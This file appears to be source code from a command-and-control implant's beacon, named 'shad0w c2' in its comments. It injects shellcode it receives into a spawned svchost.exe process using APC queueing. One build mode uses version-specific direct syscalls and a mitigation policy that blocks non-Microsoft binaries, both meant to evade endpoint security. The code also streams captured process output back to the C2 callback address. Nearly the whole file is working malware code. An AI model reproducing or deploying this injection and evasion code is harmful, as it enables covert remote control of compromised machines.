#define WIN32_LEAN_AND_MEAN

// kinda important 

#include <ntdef.h>
#include <stdio.h>
#include <stdlib.h>
#include <lmcons.h>
#include <windows.h>
#include <winbase.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <versionhelpers.h>
#include <processthreadsapi.h>

// our local stuff

#include "loader.h"
#include "settings.h"
#include "syscalls.h"

#define MAX_OUTPUT 1000
#define IDLE_KILL_TIME 60
SYSTEMTIME start_time, current_time;

void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd) 
{ 
   char chBuf[MAX_OUTPUT + 1];
   DWORD dwRead, rOpCode; 
   BOOL bSuccess = FALSE;
   
   do {
        // set the current timestamp
        GetLocalTime(&start_time);

        // read the data from the pipe
        bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, MAX_OUTPUT, &dwRead, NULL);
        
        // send the data to shad0w c2
        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, 
                         &rOpCode, (char*)chBuf, DATA_CMD_OUT, dwRead);
        
        // clean up the old buffer
        memset(chBuf, '\0', sizeof(chBuf));
   } while (TRUE);
   
   return;
}

void ProcessWatch(HANDLE pHandle)
// not currently in use as is way to cpu intensive
{
    while (TRUE)
    {
        // check if there has been any output read yet
        if (start_time.wSecond != 0)
        {
            // if no data has been read in the last 5 seconds
            GetLocalTime(&current_time);
            if ((current_time.wSecond - start_time.wSecond) >= IDLE_KILL_TIME)
            {
                // kill the process
                TerminateProcess(pHandle, 1);
                DEBUG("killed idle process");
                return;
            }
            
        }
    }
    
}

BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
{
    /*
    Run user supplied code and send all the output back to them
    */
    
    DWORD pol;
    DWORD threadId;
    HANDLE tHandle;
    HANDLE hProcess;
    SIZE_T tSize = 0;
    ULONG oProc, nProc;

    HANDLE g_hChildStd_IN_Rd = NULL;
    HANDLE g_hChildStd_IN_Wr = NULL;
    HANDLE g_hChildStd_OUT_Rd = NULL;
    HANDLE g_hChildStd_OUT_Wr = NULL;

    SECURITY_ATTRIBUTES saAttr; 

    // Set the bInheritHandle flag so pipe handles are inherited. 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL;

    // need these so we can use the correct syscalls
    OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    // resolve so we can use this later to identify what syscall we need
    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");

    // create a pipe to get the stdout 
    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
    {
        DEBUG(TEXT("StdoutRd CreatePipe")); 
    }

    // ensure the read handle to the pipe for stdout is not inherited.
    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        DEBUG(TEXT("Stdout SetHandleInformation"));
    }

    // create a pipe for the child process's stdin.
    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
    {
        DEBUG(TEXT("Stdin CreatePipe")); 
    }

    // ensure the write handle to the pipe for stdin is not inherited. 
    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
    {
        DEBUG(TEXT("Stdin SetHandleInformation"));
    }

    // define our startup info
    STARTUPINFOEXA sInfo;
    BOOL bSuccess = FALSE;
    PROCESS_INFORMATION pInfo; 

    // zero out the structures
    ZeroMemory( &sInfo, sizeof(sInfo) );
    ZeroMemory( &pInfo, sizeof(PROCESS_INFORMATION) );

    // change the std values to our pipes
    sInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA); 
    sInfo.StartupInfo.hStdError = g_hChildStd_OUT_Wr;
    sInfo.StartupInfo.hStdOutput = g_hChildStd_OUT_Wr;
    sInfo.StartupInfo.hStdInput = g_hChildStd_IN_Rd;
    sInfo.StartupInfo.dwFlags = STARTF_USESTDHANDLES | EXTENDED_STARTUPINFO_PRESENT;

    // get the os info so we can use the correct syscall number
    RtlGetVersion(&osInfo);

    // start the thread to read from the stdout pipe
    CreateThread(NULL, 0, ReadFromPipe, g_hChildStd_OUT_Rd, 0, &threadId);

    #ifdef SECURE
        // get the size of the list
        InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);

        // alloc the memory for it
        sInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(tSize);

        // now put the attributes in
        InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);

        DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

        // now update our attributes
        UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    #endif

    // use syscalls if we are in secure mode
    #ifdef SECURE
        DEBUG("doing secure exec");

        // bit of a race condition but the syscalls let us win it :)
        // spawning svchost suspended could be an ioc so thats why we are not doing that.
        // MAYBE: spawn svchost.exe with a different ppid an jus start it running
        CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);

        LPVOID rBuffer = NULL;
        SIZE_T uSize = (SIZE_T)Size;

        // make sure we are using the correct syscall numbers, probly a nicer way of doing this
        if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
        {
            NtQueueApcThread     = &NtQueueApcThread10;
            NtWriteVirtualMemory = &NtWriteVirtualMemory10;
            NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
            NtProtectVirtualMemory  = &NtProtectVirtualMemory10;
        } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
        {
            NtQueueApcThread     = &NtQueueApcThread81;
            NtWriteVirtualMemory = &NtWriteVirtualMemory81;
            NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
            NtProtectVirtualMemory  = &NtProtectVirtualMemory81;
        }

        // alloc the memory we need inside the process
        NtAllocateVirtualMemory(pInfo.hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

        // write our shellcode bytes to the process
        NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);

        // change the permisions on the memory so we can execute it
        NtProtectVirtualMemory(pInfo.hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);

        // execute the code inside the process
        NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
    #endif

    // use straight api calls if we are not in secure mode
    #ifndef SECURE
        DEBUG("doing insecure exec");

        LPVOID rBuffer;

        // create a suspended svchost
        CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);

        // alloc + write bytes + queue
        rBuffer = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pInfo.hProcess, rBuffer, (LPVOID)Bytes, Size, NULL);
        QueueUserAPC((PAPCFUNC)rBuffer, pInfo.hThread, NULL);

        // start the thread
        ResumeThread(pInfo.hThread);
        CloseHandle(pInfo.hThread);
        

    #endif

    // clean up a bit
    ZeroMemory(Bytes, Size);

    return;
}

BOOL ExecuteMemory(char* Bytes, size_t Size, BOOL Module)
{
    do
    {
        // select the correct way the code needs to be ran
        switch (Module)
        {        
        case FALSE:
            // execute arbitary user code
            SpawnCode(Bytes, Size);
        
        default:
            break;
        }

        DEBUG("code should have run");
        break;

    } while (TRUE);

    return TRUE;
}